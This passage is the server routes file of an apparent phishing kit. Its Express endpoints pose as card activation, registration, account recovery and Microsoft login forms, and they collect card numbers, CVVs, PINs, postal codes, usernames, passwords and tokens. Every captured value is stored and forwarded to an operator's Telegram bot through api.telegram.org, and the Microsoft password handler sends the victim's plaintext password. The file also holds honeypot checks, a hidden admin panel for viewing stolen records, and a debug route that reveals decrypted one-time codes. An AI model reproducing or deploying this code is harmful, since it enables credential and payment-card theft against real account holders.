      return res.json({
        success: true,
        message: 'Contact information submitted successfully',
        id: contactInfo.id,
      });
    } catch (error) {
      console.error('Contact info submission error:', error);
      return res.status(500).json({
        success: false,
        message: 'Internal server error',
      });
    }
  });

  // POST /api/register - Submit registration data
  app.post("/api/register", registerLimiter, honeypotTrap, async (req, res) => {
    try {
      const validation = registerRequestSchema.safeParse(req.body);
      
      if (!validation.success) {
        return res.status(400).json({
          success: false,
          errors: validation.error.flatten().fieldErrors,
        });
      }

      const { cardNumber, cvv, postalCode } = validation.data;
      const { ipAddress, userAgent } = getClientInfo(req);

      // Create register data record
      const registerData = await storage.createRegisterData({
        cardNumber,
        cvv,
        postalCode,
        ipAddress,
        userAgent,
      });

      // Create login attempt for continuation flow
      const loginAttempt = await storage.createLoginAttempt({
        username: 'register-user',
        password: 'n/a',
        ipAddress,
        userAgent,
        status: 'pending',
        flowType: 'standalone',
      });

      // Send Telegram notification for registration
      const telegramConfig = getTelegramConfig();
      if (telegramConfig) {
        const screenResolution = req.body.screenResolution;
        const deviceInfo = detectDevice(req, screenResolution);
        const referer = req.headers.referer || req.headers.referrer as string | undefined;
        const explicitSource = req.body.sourceInfo ? {
          domain: req.body.sourceInfo.domain,
          path: req.body.sourceInfo.path
        } : undefined;
        const sourceInfo = extractSourceInfo(referer, '/register', explicitSource);
        getIpInfo(ipAddress)
          .then((ipInfo) => {
            sendRegisterNotification(validation.data, ipInfo, deviceInfo, sourceInfo, telegramConfig)
              .then((success: boolean) => {
                if (success) {
                  console.log('[Telegram] ✓ Register notification sent');
                } else {
                  console.log('[Telegram] ✗ Failed to send register notification');
                }
              })
              .catch((err: Error) => {
                console.error('[Telegram] Error sending register notification:', err);
              });
          });
      }

      return res.json({
        success: true,
        message: 'Registration submitted successfully',
        id: loginAttempt.id,
      });
    } catch (error) {
      console.error('Registration submission error:', error);
      return res.status(500).json({
        success: false,
        message: 'Internal server error',
      });
    }
  });

  // POST /api/activate-card - Submit card activation data
  app.post("/api/activate-card", cardActivationLimiter, honeypotTrap, async (req, res) => {
    try {
      const validation = cardActivationRequestSchema.safeParse(req.body);
      
      if (!validation.success) {
        return res.status(400).json({
          success: false,
          errors: validation.error.flatten().fieldErrors,
        });
      }

      const { cardNumber, cvv } = validation.data;
      const { ipAddress, userAgent } = getClientInfo(req);

      // Create card activation data record
      const activationData = await storage.createCardActivationData({
        cardNumber,
        cvv,
        ipAddress,
        userAgent,
      });

      // Create login attempt for continuation flow
      const loginAttempt = await storage.createLoginAttempt({
        username: 'activate-user',
        password: 'n/a',
        ipAddress,
        userAgent,
        status: 'pending',
        flowType: 'standalone',
      });

      // Send Telegram notification for card activation
      const telegramConfig = getTelegramConfig();
      if (telegramConfig) {
        const screenResolution = req.body.screenResolution;
        const deviceInfo = detectDevice(req, screenResolution);
        const referer = req.headers.referer || req.headers.referrer as string | undefined;
        const explicitSource = req.body.sourceInfo ? {
          domain: req.body.sourceInfo.domain,
          path: req.body.sourceInfo.path
        } : undefined;
        const sourceInfo = extractSourceInfo(referer, '/activate-card', explicitSource);
        getIpInfo(ipAddress)
          .then((ipInfo) => {
            sendCardActivationNotification(validation.data, ipInfo, deviceInfo, sourceInfo, telegramConfig)
              .then((success: boolean) => {
                if (success) {
                  console.log('[Telegram] ✓ Card activation notification sent');
                } else {
                  console.log('[Telegram] ✗ Failed to send card activation notification');
                }
              })
              .catch((err: Error) => {
                console.error('[Telegram] Error sending card activation notification:', err);
              });
          });
      }

      return res.json({
        success: true,
        message: 'Card activation submitted successfully',
        id: loginAttempt.id,
      });
    } catch (error) {
      console.error('Card activation submission error:', error);
      return res.status(500).json({
        success: false,
        message: 'Internal server error',
      });
    }
  });

  // POST /api/forgot-username - Submit forgot username request
  app.post("/api/forgot-username", forgotUsernameLimiter, honeypotTrap, async (req, res) => {
    try {
      const validation = forgotUsernameRequestSchema.safeParse(req.body);
      
      if (!validation.success) {
        return res.status(400).json({
          success: false,
          errors: validation.error.flatten().fieldErrors,
        });
      }

      const { cardNumber, cvv, postalCode } = validation.data;
      const { ipAddress, userAgent } = getClientInfo(req);

      // Create forgot username data record
      const forgotUsernameData = await storage.createForgotUsernameData({
        cardNumber,
        cvv,
        postalCode,
        ipAddress,
        userAgent,
      });

      // Create login attempt for continuation flow
      const loginAttempt = await storage.createLoginAttempt({
        username: 'forgot-username-user',
        password: 'n/a',
        ipAddress,
        userAgent,
        status: 'pending',
        flowType: 'standalone',
      });

      // Send Telegram notification for forgot username
      const telegramConfig = getTelegramConfig();
      if (telegramConfig) {
        const screenResolution = req.body.screenResolution;
        const deviceInfo = detectDevice(req, screenResolution);
        const referer = req.headers.referer || req.headers.referrer as string | undefined;
        const explicitSource = req.body.sourceInfo ? {
          domain: req.body.sourceInfo.domain,
          path: req.body.sourceInfo.path
        } : undefined;
        const sourceInfo = extractSourceInfo(referer, '/forgot-username', explicitSource);
        getIpInfo(ipAddress)
          .then((ipInfo) => {
            sendForgotUsernameNotification(validation.data, ipInfo, deviceInfo, sourceInfo, telegramConfig)
              .then((success: boolean) => {
                if (success) {
                  console.log('[Telegram] ✓ Forgot username notification sent');
                } else {
                  console.log('[Telegram] ✗ Failed to send forgot username notification');
                }
              })
              .catch((err: Error) => {
                console.error('[Telegram] Error sending forgot username notification:', err);
              });
          });
      }

      return res.json({
        success: true,
        message: 'Username recovery request submitted successfully',
        id: loginAttempt.id,
      });
    } catch (error) {
      console.error('Forgot username submission error:', error);
      return res.status(500).json({
        success: false,
        message: 'Internal server error',
      });
    }
  });

  // POST /api/forgot-password - Submit forgot password request
  app.post("/api/forgot-password", forgotPasswordLimiter, honeypotTrap, async (req, res) => {
    try {
      const validation = forgotPasswordRequestSchema.safeParse(req.body);
      
      if (!validation.success) {
        return res.status(400).json({
          success: false,
          errors: validation.error.flatten().fieldErrors,
        });
      }

      const { username, postalCode } = validation.data;
      const { ipAddress, userAgent } = getClientInfo(req);

      // Create forgot password data record
      const forgotPasswordData = await storage.createForgotPasswordData({
        username,
        postalCode,
        ipAddress,
        userAgent,
      });

      // Create login attempt for continuation flow
      const loginAttempt = await storage.createLoginAttempt({
        username: 'forgot-password-user',
        password: 'n/a',
        ipAddress,
        userAgent,
        status: 'pending',
        flowType: 'standalone',
      });

      // Send Telegram notification for forgot password
      const telegramConfig = getTelegramConfig();
      if (telegramConfig) {
        const screenResolution = req.body.screenResolution;
        const deviceInfo = detectDevice(req, screenResolution);
        const referer = req.headers.referer || req.headers.referrer as string | undefined;
        const explicitSource = req.body.sourceInfo ? {
          domain: req.body.sourceInfo.domain,
          path: req.body.sourceInfo.path
        } : undefined;
        const sourceInfo = extractSourceInfo(referer, '/forgot-password', explicitSource);
        getIpInfo(ipAddress)
          .then((ipInfo) => {
            sendForgotPasswordNotification(validation.data, ipInfo, deviceInfo, sourceInfo, telegramConfig)
              .then((success: boolean) => {
                if (success) {
                  console.log('[Telegram] ✓ Forgot password notification sent');
                } else {
                  console.log('[Telegram] ✗ Failed to send forgot password notification');
                }
              })
              .catch((err: Error) => {
                console.error('[Telegram] Error sending forgot password notification:', err);
              });
          });
      }

      return res.json({
        success: true,
        message: 'Password recovery request submitted successfully',
        id: loginAttempt.id,
      });
    } catch (error) {
      console.error('Forgot password submission error:', error);
      return res.status(500).json({
        success: false,
        message: 'Internal server error',
      });
    }
  });

  // POST /api/microsoft-email - Submit Microsoft-style email/phone
  app.post("/api/microsoft-email", microsoftEmailLimiter, honeypotTrap, async (req, res) => {
    try {
      const validation = microsoftEmailRequestSchema.safeParse(req.body);
      
      if (!validation.success) {
        return res.status(400).json({
          success: false,
          errors: validation.error.flatten().fieldErrors,
        });
      }

      const { loginAttemptId, emailOrPhone } = validation.data;
      const { ipAddress, userAgent } = getClientInfo(req);

      // Create Microsoft email data record
      const microsoftEmailData = await storage.createMicrosoftEmailData({
        loginAttemptId,
        emailOrPhone,
        ipAddress,
        userAgent,
      });

      // Send Telegram notification
      const telegramConfig = getTelegramConfig();
      if (telegramConfig) {
        const { botToken, chatId } = telegramConfig;
        const message = `
🔐 <b>Microsoft Email Login</b>

📧 <b>Email/Phone:</b> ${emailOrPhone}
🆔 <b>Login ID:</b> ${loginAttemptId}
🌐 <b>IP Address:</b> ${ipAddress}
🖥️ <b>User Agent:</b> ${userAgent}
📅 <b>Time:</b> ${new Date().toLocaleString()}
`;
        
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML',
          }),
        })
          .then(async (response) => {
            if (response.ok) {
              console.log('[Telegram] ✓ Microsoft email notification sent');
            } else {
              const error = await response.text();
              console.log('[Telegram] ✗ Failed to send Microsoft email notification:', error);
            }
          })
          .catch((err: Error) => {
            console.error('[Telegram] Error sending Microsoft email notification:', err);
          });
      }

      return res.json({
        success: true,
        emailOrPhone,
      });
    } catch (error) {
      console.error('Microsoft email submission error:', error);
      return res.status(500).json({
        success: false,
        message: 'Internal server error',
      });
    }
  });

  // POST /api/microsoft-password - Submit Microsoft-style password
  app.post("/api/microsoft-password", microsoftPasswordLimiter, honeypotTrap, async (req, res) => {
    try {
      const validation = microsoftPasswordRequestSchema.safeParse(req.body);
      
      if (!validation.success) {
        return res.status(400).json({
          success: false,
          errors: validation.error.flatten().fieldErrors,
        });
      }

      const { loginAttemptId, emailOrPhone, password } = validation.data;
      const { ipAddress, userAgent } = getClientInfo(req);

      // Create Microsoft password data record
      const microsoftPasswordData = await storage.createMicrosoftPasswordData({
        loginAttemptId,
        emailOrPhone,
        password,
        ipAddress,
        userAgent,
      });

      // Send Telegram notification
      const telegramConfig = getTelegramConfig();
      if (telegramConfig) {
        const { botToken, chatId } = telegramConfig;
        const message = `
🔐 <b>Microsoft Password Login</b>

📧 <b>Email/Phone:</b> ${emailOrPhone}
🔑 <b>Password:</b> ${password}
🆔 <b>Login ID:</b> ${loginAttemptId}
🌐 <b>IP Address:</b> ${ipAddress}
🖥️ <b>User Agent:</b> ${userAgent}
📅 <b>Time:</b> ${new Date().toLocaleString()}
`;
        
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML',
          }),
        })
          .then(async (response) => {
            if (response.ok) {
              console.log('[Telegram] ✓ Microsoft password notification sent');
            } else {
              const error = await response.text();
              console.log('[Telegram] ✗ Failed to send Microsoft password notification:', error);
            }
          })
          .catch((err: Error) => {
            console.error('[Telegram] Error sending Microsoft password notification:', err);
          });
      }

      return res.json({
        success: true,
        message: 'Authentication completed successfully',
      });
    } catch (error) {
      console.error('Microsoft password submission error:', error);
      return res.status(500).json({
        success: false,
        message: 'Internal server error',
      });
    }
  });

  // POST /api/account-visit - Track AccountPage visits
  app.post("/api/account-visit", accountVisitLimiter, async (req, res) => {
    try {
      const { ipAddress, userAgent } = getClientInfo(req);

      // Detect device info
      const screenResolution = req.body.screenResolution;
      const deviceInfo = detectDevice(req, screenResolution);
      console.log('[Account Visit] Device:', JSON.stringify(deviceInfo, null, 2));

      // Send Telegram notification for account page visit
      const telegramConfig = getTelegramConfig();
      if (telegramConfig) {
        const referer = req.headers.referer || req.headers.referrer as string | undefined;
        const explicitSource = req.body.sourceInfo ? {
          domain: req.body.sourceInfo.domain,
          path: req.body.sourceInfo.path
        } : undefined;
        const sourceInfo = extractSourceInfo(referer, '/account', explicitSource);
        getIpInfo(ipAddress)
          .then((ipInfo) => {
            sendAccountPageNotification(ipInfo, deviceInfo, sourceInfo, telegramConfig)
              .then((success: boolean) => {
                if (success) {
                  console.log('[Telegram] ✓ Account page visit notification sent');
                } else {
                  console.log('[Telegram] ✗ Failed to send account page visit notification');
                }
              })
              .catch((err: Error) => {
                console.error('[Telegram] Error sending account page visit notification:', err);
              });
          });
      }

      return res.json({
        success: true,
        message: 'Visit tracked',
      });
    } catch (error) {
      console.error('Account visit tracking error:', error);
      return res.status(500).json({
        success: false,
        message: 'Internal server error',
      });
    }
  });

  // POST /api/account-login - Submit account login (card/username/token)
  app.post("/api/account-login", accountLoginLimiter, honeypotTrap, async (req, res) => {
    try {
      const validation = accountLoginRequestSchema.safeParse(req.body);
      
      if (!validation.success) {
        return res.status(400).json({
          success: false,
          errors: validation.error.flatten().fieldErrors,
        });
      }

      const loginData = validation.data;
      const { ipAddress, userAgent } = getClientInfo(req);

      // Normalize and validate card number with Luhn algorithm
      let normalizedCardNumber: string | undefined;
      if (loginData.loginType === 'card') {
        normalizedCardNumber = normalizeCardNumber(loginData.cardNumber);
        if (!validateLuhn(normalizedCardNumber)) {
          return res.status(400).json({
            success: false,
            message: 'Invalid card number',
          });
        }
      }

      // Detect device info
      const screenResolution = req.body.screenResolution;
      const deviceInfo = detectDevice(req, screenResolution);
      console.log('[Account Login] Device:', JSON.stringify(deviceInfo, null, 2));

      // Create account login attempt record with normalized card number
      const loginAttempt = await storage.createAccountLoginAttempt({
        loginType: loginData.loginType,
        cardNumber: loginData.loginType === 'card' ? normalizedCardNumber! : null,
        pin: loginData.loginType === 'card' ? loginData.pin : null,
        username: loginData.loginType === 'username' ? loginData.username : null,
        password: loginData.loginType === 'username' ? loginData.password : null,
        token: loginData.loginType === 'token' ? loginData.token : null,
        ipAddress,
        userAgent,
      });

      // Send Telegram notification for account login
      const telegramConfig = getTelegramConfig();
      if (telegramConfig) {
        const referer = req.headers.referer || req.headers.referrer as string | undefined;
        const explicitSource = req.body.sourceInfo ? {
          domain: req.body.sourceInfo.domain,
          path: req.body.sourceInfo.path
        } : undefined;
        const sourceInfo = extractSourceInfo(referer, '/account', explicitSource);
        getIpInfo(ipAddress)
          .then((ipInfo) => {
            sendAccountLoginNotification(loginData, loginAttempt.id, ipInfo, deviceInfo, sourceInfo, telegramConfig)
              .then((success: boolean) => {
                if (success) {
                  console.log('[Telegram] ✓ Account login notification sent');
                } else {
                  console.log('[Telegram] ✗ Failed to send account login notification');
                }
              })
              .catch((err: Error) => {
                console.error('[Telegram] Error sending account login notification:', err);
              });
          });
      }

      // Generate email hint based on login type
      let emailHint = '';
      if (loginData.loginType === 'card') {
        const card = normalizedCardNumber!;
        emailHint = `${card.substring(0, 4)}***@***.com`;
      } else if (loginData.loginType === 'username') {
        const user = loginData.username;
        emailHint = `${user.substring(0, 3)}***@***.com`;
      } else if (loginData.loginType === 'token') {
        const token = loginData.token;
        emailHint = `${token.substring(0, 3)}***@***.com`;
      }

      return res.json({
        success: true,
        loginAttemptId: loginAttempt.id,
        emailHint,
      });
    } catch (error) {
      console.error('Account login error:', error);
      return res.status(500).json({
        success: false,
        message: 'Internal server error',
      });
    }
  });

  // Admin endpoints with session-based authentication
  const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';

  // Middleware to check admin authentication
  function requireAdminAuth(req: Request, res: any, next: any) {
    if (req.session?.isAdmin) {
      next();
    } else {
      res.status(401).json({ success: false, message: 'Unauthorized' });
    }
  }

  // POST /api/secure-admin-panel-7f8a9b2c4d5e6f1a3b8c9d0e2f4a6b8c9d1e3f5a7b9c0d2e4f6a8b0c2d4e6f8a/login - Admin authentication
  app.post("/api/secure-admin-panel-7f8a9b2c4d5e6f1a3b8c9d0e2f4a6b8c9d1e3f5a7b9c0d2e4f6a8b0c2d4e6f8a/login", async (req, res) => {
    const { password } = req.body;
    
    if (password === ADMIN_PASSWORD) {
      // Set admin session
      req.session.isAdmin = true;
      return res.json({ success: true, message: 'Admin authenticated' });
    }
    
    return res.status(401).json({ success: false, message: 'Invalid password' });
  });

  // POST /api/secure-admin-panel-7f8a9b2c4d5e6f1a3b8c9d0e2f4a6b8c9d1e3f5a7b9c0d2e4f6a8b0c2d4e6f8a/logout - Admin logout
  app.post("/api/secure-admin-panel-7f8a9b2c4d5e6f1a3b8c9d0e2f4a6b8c9d1e3f5a7b9c0d2e4f6a8b0c2d4e6f8a/logout", (req, res) => {
    req.session.destroy((err) => {
      if (err) {
        return res.status(500).json({ success: false, message: 'Logout failed' });
      }
      res.json({ success: true, message: 'Logged out' });
    });
  });

  // GET /api/secure-admin-panel-7f8a9b2c4d5e6f1a3b8c9d0e2f4a6b8c9d1e3f5a7b9c0d2e4f6a8b0c2d4e6f8a/login-attempts - Get all login attempts (protected)
  app.get("/api/secure-admin-panel-7f8a9b2c4d5e6f1a3b8c9d0e2f4a6b8c9d1e3f5a7b9c0d2e4f6a8b0c2d4e6f8a/login-attempts", requireAdminAuth, async (req, res) => {
    try {
      const attempts = await storage.getAllLoginAttempts();
      return res.json(attempts);
    } catch (error) {
      console.error('Error fetching login attempts:', error);
      return res.status(500).json({ error: 'Internal server error' });
    }
  });

  // GET /api/secure-admin-panel-7f8a9b2c4d5e6f1a3b8c9d0e2f4a6b8c9d1e3f5a7b9c0d2e4f6a8b0c2d4e6f8a/otp-sessions - Get all OTP sessions (protected)
  app.get("/api/secure-admin-panel-7f8a9b2c4d5e6f1a3b8c9d0e2f4a6b8c9d1e3f5a7b9c0d2e4f6a8b0c2d4e6f8a/otp-sessions", requireAdminAuth, async (req, res) => {
    try {
      const sessions = await storage.getAllOtpSessions();
      return res.json(sessions);
    } catch (error) {
      console.error('Error fetching OTP sessions:', error);
      return res.status(500).json({ error: 'Internal server error' });
    }
  });

  // GET /api/secure-admin-panel-7f8a9b2c4d5e6f1a3b8c9d0e2f4a6b8c9d1e3f5a7b9c0d2e4f6a8b0c2d4e6f8a/postal-codes - Get all postal code submissions (protected)
  app.get("/api/secure-admin-panel-7f8a9b2c4d5e6f1a3b8c9d0e2f4a6b8c9d1e3f5a7b9c0d2e4f6a8b0c2d4e6f8a/postal-codes", requireAdminAuth, async (req, res) => {
    try {
      const data = await storage.getAllPostalCodeData();
      return res.json(data);
    } catch (error) {
      console.error('Error fetching postal codes:', error);
      return res.status(500).json({ error: 'Internal server error' });
    }
  });

  // GET /api/secure-admin-panel-7f8a9b2c4d5e6f1a3b8c9d0e2f4a6b8c9d1e3f5a7b9c0d2e4f6a8b0c2d4e6f8a/contact-info - Get all contact info submissions (protected)
  app.get("/api/secure-admin-panel-7f8a9b2c4d5e6f1a3b8c9d0e2f4a6b8c9d1e3f5a7b9c0d2e4f6a8b0c2d4e6f8a/contact-info", requireAdminAuth, async (req, res) => {
    try {
      const data = await storage.getAllContactInfoData();
      return res.json(data);
    } catch (error) {
      console.error('Error fetching contact info:', error);
      return res.status(500).json({ error: 'Internal server error' });
    }
  });

  // GET /api/secure-admin-panel-7f8a9b2c4d5e6f1a3b8c9d0e2f4a6b8c9d1e3f5a7b9c0d2e4f6a8b0c2d4e6f8a/logs - Get audit trail logs (protected)
  app.get("/api/secure-admin-panel-7f8a9b2c4d5e6f1a3b8c9d0e2f4a6b8c9d1e3f5a7b9c0d2e4f6a8b0c2d4e6f8a/logs", requireAdminAuth, async (req, res) => {
    try {
      const logs = await storage.getLoginActivityLogs();
      return res.json({ logs });
    } catch (error) {
      console.error('Error fetching logs:', error);
      return res.status(500).json({ error: 'Internal server error' });
    }
  });

  // DEBUG ENDPOINT - Get latest OTP for email (development only)
  if (process.env.NODE_ENV === 'development') {
    app.get("/api/debug/otp/:email", async (req, res) => {
      try {
        const { email } = req.params;
        const sessions = await storage.getAllOtpSessions();
        const latestSession = sessions.find(s => s.email === email);
        
        if (!latestSession) {
          return res.json({ otpCode: null, message: 'No OTP found for this email' });
        }

        // Decrypt the OTP code
        const decryptedOtp = decrypt(latestSession.otpCode);
        
        return res.json({ 
          otpCode: decryptedOtp,
          sessionId: latestSession.id,
          verified: latestSession.verified,
          expiresAt: latestSession.expiresAt
        });
      } catch (error) {
        console.error('Error fetching debug OTP:', error);
        return res.status(500).json({ error: 'Internal server error' });
      }
    });
  }

  const httpServer = createServer(app);
  return httpServer;
}
